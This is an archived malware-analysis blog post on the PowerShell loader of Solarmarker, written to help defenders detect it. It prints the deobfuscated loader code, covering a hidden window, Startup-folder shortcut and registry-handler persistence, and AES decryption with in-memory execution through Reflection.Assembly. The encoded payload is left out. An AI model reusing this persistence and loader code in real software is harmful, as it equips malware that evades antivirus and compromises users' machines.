{
    "id": "672d8651-9230-4eb4-92a9-17436f238414",
    "created_at": "2023-02-02T02:08:14.332485Z",
    "updated_at": "2025-03-27T02:06:15.543947Z",
    "deleted_at": null,
    "sha1_hash": "ccf8f4531fb66e9224f7ecd1b3116c7fe36c8815",
    "title": "2022-09-27 - Solarmarker- The Old is New",
    "authors": "",
    "file_creation_date": "2023-02-01T07:49:41Z",
    "file_modification_date": "2023-02-01T07:49:41Z",
    "file_size": 669522,
    "plain_text": "# Solarmarker: The Old is New\n\n**squiblydoo.blog/2022/09/27/solarmarker-the-old-is-new/**\n\nBy squiblydoo September 27, 2022\n\nThe purpose of this blogpost is to document the PowerShell used by Solarmarker. The\nPowerShell was first observed between Feb 2022 until May 2022 and then resurfaced in\nSeptember 2022.\n\nThe goal of this post is to publish information regarding the PowerShell to enable others to\nidentify and understand what the PowerShell is doing.\n\nDetecting these tactics is important to detect Solarmarker and detecting other malware.\n\n## Intro\n\nFrom May 2022 – August 2022, the Solarmarker Developer moved away from using\nPowerShell scripts and from executing PowerShell using\n```\nSystem.Automation.Management.dll to creating persistent with native .NET commands.\n\n```\nThe use of PowerShell was observed between Feb 2022 and May 2022. The PowerShell\n[was also observed in a recent sample and as a result, it became worthwhile to publish about](https://twitter.com/SquiblydooBlog/status/1574669745651163137)\nthe PowerShell. The PowerShell during both periods is virtually the same helping us identify\nthe malware easily and consistently identify the malware as Solarmarker.\n\n## Script Overview\n\n[PowerShell script content can be logged with PowerShell Scriptblock Logging, or it can be](https://www.mandiant.com/resources/greater-visibilityt)\nlogged through EDR. In this instance, the detection logged 13 massive blocks of PowerShell.\nMost of the PowerShell script blocks consisted of a Base64 encoded payload. I’ve included\nthe PowerShell below without the encoded payload.\n\nThe PowerShell script is normally one block, but we’ve broken it up for readability in the\nimage below.\n\n\n-----\n\nImage: PowerShell from the payload. .\nFirst, let’s talk about the (many) red flags that suggest it’s malicious:\n\n**The functions and variables don’t have human readable names.**\n\nSometimes, there’s a good reason to have short and simple PowerShell function or variable\nnames, but in many cases, PowerShell should be easy to follow. This helps analysts\nunderstand what is happening and helps developers revise the PowerShell when needed. In\nthis case, the long random names are suspicious.\n\n**The PowerShell uses “chunking.”**\n\nChunking is breaking up words to avoid detection. For example,\n‘\\M’+’icr’+’oso’+’ft’+’\\W’+’ind’+’ow’+’s\\’+’St’+’art’+’ Me’+’nu’+’\\Pr’+’ogr’+’ams\\’+’St’+’art’+’up’.\nThis chunking can prevent some detections from catching the full words. Chunking is\nabnormal for benign scripts and is an indicator the author is trying to avoid being detected.\n\n**The script uses “Reflection.Assembly” to load something into memory.**\n\n“Reflection.Assembly” has legitimate uses, but combined with the other red flags, this tells us\nthe author is loading a DotNet binary into memory instead of writing it to disk. This prevents\nantivirus from finding the binary on disk, as the payload is only decrypted in memory.\n\n\n-----\n\n**The massive Base64 string is suspicious.**\n\nBase64 encoding can have legitimate purposes. But, if it’s uncommon in an environment or if\nan administrator or developer is unfamiliar with the Base64 used, the PowerShell should be\nconsidered suspicious.\n\n**The use of AES encryption in a script (“AesCryptoService Provider”).**\n\nUsing AES encryption is a reliable way for malware to avoid detection, and it’s uncommon\nand highly unusual to find it in legitimate PowerShell scripts.\n\n**The script uses “iex,” also known as “Invoke Expression.”**\n\nInvoke Expression is a common way for attackers to execute code. When reviewing\nPowerShell, it’s important to investigate what’s being executed. When “iex” is used, it should\nbe considered suspicious.\n\n## Script Content\n\nTo make the PowerShell script more readable, we use “find and replace” to rename variables\nbased on what we think each part is doing, given the surrounding context. Find and replace\nallows us to clarify where the same variables are reused.\n\nIf you do this, be prepared to make guesses that you’ll likely revise later. In renaming the\nvariables, we may also need to do some Googling to better understand functions and to help\nus give the variables better names. If you can’t read the image, don’t worry, parts will be\ncopied below.\n\nImage: PowerShell after variables have been renamed.\nNow that we’ve cleaned up the PowerShell, we finally have an idea of what’s going on.\n\n\n-----\n\nThe PowerShell first sets up two functions: create_random, which is used for generating\nrandom numbers later, and “create_registry_key.” “Create_registry_key” takes two\nparameters: the path of the registry key to be created and the content the key will have.\n```\nfunction create_random {\n\n  return -join (0..(10..30|Get-Random)|%{char+(97..122)|Get-Random)})    \n\n  }        \n\nfunction create_registry_key { param($registryKeyPath, $registryKeyContent);\n\n  if (-Not (Test-Path \"Registry::$registryKeyPath \".Trim())){\n\n    New-Item -Path \"Registry::$registryKeyPath \".Trim() -ItemType RegistryKey Force;      \n\n    }\n\n    Set-Item -Path \"Registry::$registryKeyPath \".Trim() -Value\n$registryKeyContent;   \n\n  }\n\n```\nThe PowerShell imports a Windows DLL (user32.dll) to access the Windows API\n“‘Win32ShowWindowAsync’.” Using this Windows API, the malware can make sure the\nPowerShell or current window stays hidden at execution.\n```\n$hiddenWindow=\"$showWindowAsync=Add-Type -MemberDefinition\n('[DllImport(\"user32.dll\")]public static extern bool ShowWindowAsync(IntPtr hWnd, int\nnCmdShow);') -Name ('Win32ShowWindowAsync') -Namespace Win32Functions -PassThru;\n$showWindowAsync::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 0);\"; \niex $hiddenWindow;   \n\n```\nThe script then creates a few random names, and also creates a directory in the user’s\ntemporary directory. This randomly named folder, with a randomly named file, with a random\nfile extension, will be used later: for now, it’s saved as “$pathToWriteTo.”\n```\n$randomFileName=(create_random);    \n$newFileExtension=(create_random);    \n$randomFolderInTemp=\"$env:temp\\\"+(create_random);\nNew-Item -ItemType Directory -Force -Path $randomFolderInTemp;\n$pathToWriteTo = $randomFolderInTemp+'\\'+$randomFileName+'.'+$newFileExtension;\n\n```\nAfter this path is created, a shortcut, or “.lnk” file, is created in the user’s Startup folder. The\nshortcut is created using WScript, which will have a random name and point to our\n$pathToWriteToFile variable. This is a favorite directory for malware authors, as files in it are\nexecuted on startup.\n```\n$wscriptCommand=New-Object -comObject WScript.Shell;\n$startupShortcut=$wscriptCommand.CreateShortcut($env:appdata+'\\Microsoft\\Windows\\Star\nt Menu\\Programs\\Startup\\'+(create_random)+'.lnk');\n$startupShortcut.TargetPath=$pathToWriteTo;\n$startupShortcut.WindowStyle=7;\n$startupShortcut.Save();\n\n```\n\n-----\n\nThe PowerShell then uses the create_registry_key function defined earlier. It creates\n“HKEY_CURRENT_USER\\Software\\Classes\\”+$extensionClass+”\\shell\\open\\command,”\nwhich holds “powershell -command $binaryDecodeAndExecute.”\n\nThe variable “$binaryDecodeAndExecute” uses AES to decrypt the “LARGE-BLOCK-OFBASE64” after it’s decoded from base64.\n\nThis variable also contains two cryptic lines:\n```\n[Reflection.Assembly]::Load($UB);\n[cU0tev650WfbmHd2R.ArdcDR284Rt7PtrhOYIn]::jXEOyajI0oTBaWmmdt()\n\n```\nThese lines load this DotNet module into memory using “Reflection Assembly” and then\nexecute it using a function exported by the module. The random strings are to avoid\ndetection: previously, defenders would flag the binary’s name, but the author has now\nrandomized it.\n```\n$binaryDecodeAndExecute = $hiddenWindow+ \"$AC=New-Object\nSystem.Security.Cryptography.AesCryptoServiceProvider;\n$AC.Key=[Convert]::FromBase64String('U1+GbY9S+sraJD5n+VLaXjIEFeFkMaccxdshs7f3+5E=');\n$EB=[Convert]::FromBase64String([IO.File]::ReadAllText('\"+$pathToWriteTo+\"'));\n$AC.IV = $EB[0..15];$Decryptor=$AC.CreateDecryptor();\n$UB=$Decryptor.TransformFinalBlock($EB, 16, $EB.Length-16);\n$AC.Dispose();\n$extensionClass=(create_random);\ncreate_registry_key -registryKeyPath\n(\"HKEY_CURRENT_USER\\Software\\Classes\\\"+$extensionClass+\"\\shell\\open\\command\") registryKeyContent ('powershell -command \"'+$binaryDecodeAndExecute+'\"');\ncreate_registry_key -registryKeyPath\n(\"HKEY_CURRENT_USER\\Software\\Classes.\"+$newFileExtension) -registryKeyContent\n$extensionClass;\n[IO.File]::WriteAllText($pathToWriteTo, ‘LARGE-BLOCK-OF-BASE64’);\niex $binaryDecodeAndExecute;\n\n```\nThe first part of this block calls the necessary functions to decrypt the binary and all of the\ndecrypting commands are saved in the registry.\n\nThe second “create_registry_key” function sets up a registry key that will call the other\nregistry key that was just established. This establishes an execution chain every time the\ncomputer is rebooted. This is explained in the following screenshots from a sandboxed\nenvironment.\n\nAs described previously, a file (“ydCbwPDZwnuefc”) was created in the Startup folder. This\nshortcut executes a file with a really long name. The file names are created by the\n“create_random” function and they differ between infections.\n\n\n-----\n\nImage: The file in the Startup directory for running the malware at each boot\nThis file is stored in the user’s local temp directory. The file with a really long name has a\nrandom extension: “PSDQD…” When this extension is used, it takes info stored in the\nrandomly named “xqmsyf…” registry key.\n\nImage: The file with a new file extension and the file extension in the Windows registry\nThe “xqmsyf…” registry key contains the PowerShell command the script set up earlier. This\nPowerShell is the decryption and execution process noted above.\n\n\n-----\n\nImage: The registry key that contains the PowerShell to decode and execute the backdoor.\nAt the end of the script, the author also used “iex $binaryDecodeAndExecute” to execute the\nbinary file and start the backdoor for its first run.\n\n## Outro\n\nWe’ve looked thoroughly at the PowerShell script used by Solarmarker in Feb 2022 – May\n2022; and which was recently seen in September 2022. I hope this analysis helps you in\nidentifying the malware in the past, present, and future.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-27 - Solarmarker- The Old is New.pdf"
    ],
    "report_names": [
        "2022-09-27 - Solarmarker- The Old is New.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1675303694,
    "ts_updated_at": 1743041175,
    "ts_creation_date": 1675237781,
    "ts_modification_date": 1675237781,
    "files": {
        "pdf": "https://archive.orkl.eu/ccf8f4531fb66e9224f7ecd1b3116c7fe36c8815.pdf",
        "text": "https://archive.orkl.eu/ccf8f4531fb66e9224f7ecd1b3116c7fe36c8815.txt",
        "img": "https://archive.orkl.eu/ccf8f4531fb66e9224f7ecd1b3116c7fe36c8815.jpg"
    }
}